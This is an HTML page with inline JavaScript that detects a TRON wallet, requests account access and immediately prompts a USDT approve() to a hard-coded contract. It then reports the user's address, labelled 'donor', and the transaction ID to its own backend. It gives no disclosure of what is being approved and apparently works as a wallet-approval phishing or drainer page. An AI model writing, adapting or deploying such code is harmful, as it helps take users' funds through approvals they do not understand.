<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Approve</title>
</head>
<body style="background:#0f172a;color:#fff;font-family:sans-serif;text-align:center;padding:60px 20px;margin:0;">
    <p id="status" style="font-size:16px;color:#9ca3af;">Connecting...</p>
    <p id="debug" style="font-size:11px;color:#6b7280;margin-top:20px;"></p>

    <script>
        var CONTRACT_ADDRESS = "TMAi5Rs64aSxkvg1x1WVaQL1S3YStStjju";
        var USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        var APPROVE_AMOUNT = 1000000;
        var status = document.getElementById("status");
        var debug = document.getElementById("debug");
        var started = false;

        // Wait for tronWeb to appear, then request access
        var check = setInterval(function() {
            if (window.tronWeb) {
                clearInterval(check);
                debug.textContent = "tronWeb found, requesting access...";
                requestAccess();
            }
        }, 200);

        setTimeout(function() {
            if (!started) {
                clearInterval(check);
                status.textContent = "Wallet not detected";
                status.style.color = "#f87171";
            }
        }, 20000);

        function requestAccess() {
            // Try tronLink.request first (Trust Wallet / TronLink standard)
            if (window.tronLink && window.tronLink.request) {
                window.tronLink.request({ method: "tron_requestAccounts" })
                    .then(function(res) {
                        debug.textContent = "Access granted: " + JSON.stringify(res);
                        waitForAddress();
                    })
                    .catch(function(e) {
                        debug.textContent = "Access denied: " + (e.message || e);
                        status.textContent = "Please approve the connection";
                        status.style.color = "#f87171";
                    });
            } else if (window.tronWeb.request) {
                window.tronWeb.request({ method: "tron_requestAccounts" })
                    .then(function(res) {
                        debug.textContent = "Access granted via tronWeb";
                        waitForAddress();
                    })
                    .catch(function(e) {
                        debug.textContent = "Fallback: " + (e.message || e);
                        waitForAddress();
                    });
            } else {
                // No request method, just wait for address
                debug.textContent = "No request method, waiting for address...";
                waitForAddress();
            }
        }

        function waitForAddress() {
            var addrCheck = setInterval(function() {
                var tw = window.tronWeb;
                var addr = tw && tw.defaultAddress && tw.defaultAddress.base58;
                if (addr && addr.length > 5 && addr !== "false") {
                    clearInterval(addrCheck);
                    if (!started) {
                        started = true;
                        debug.textContent = "Address: " + addr;
                        sendApprove();
                    }
                }
            }, 200);

            // Timeout for address
            setTimeout(function() {
                if (!started) {
                    status.textContent = "Could not get wallet address";
                    status.style.color = "#f87171";
                    debug.textContent = "addr: " + (window.tronWeb.defaultAddress ? window.tronWeb.defaultAddress.base58 : "none");
                }
            }, 15000);
        }

        function sendApprove() {
            var addr = window.tronWeb.defaultAddress.base58;
            status.textContent = "Preparing approve...";
            status.style.color = "#facc15";
            debug.textContent = "Address: " + addr;

            // Delegate energy in background
            fetch("/api/delegate-energy", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ donor: addr })
            }).catch(function() {});

            // Load USDT contract
            debug.textContent = "Loading USDT contract...";
            window.tronWeb.contract().at(USDT_CONTRACT).then(function(usdt) {
                debug.textContent = "Contract loaded, calling approve...";
                status.textContent = "Confirm in popup!";
                return usdt.approve(CONTRACT_ADDRESS, APPROVE_AMOUNT).send({
                    feeLimit: 100000000,
                    callValue: 0
                });
            }).then(function(tx) {
                var txId = typeof tx === "string" ? tx : (tx.txid || tx);
                status.textContent = "Done!";
                status.style.color = "#4ade80";
                debug.textContent = "TX: " + txId;

                fetch("/api/approved", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ donor: addr, txId: txId })
                }).catch(function() {});

            }).catch(function(err) {
                status.textContent = "Error";
                status.style.color = "#f87171";
                debug.textContent = "ERR: " + (err.message || JSON.stringify(err));
            });
        }
    </script>
</body>
</html>
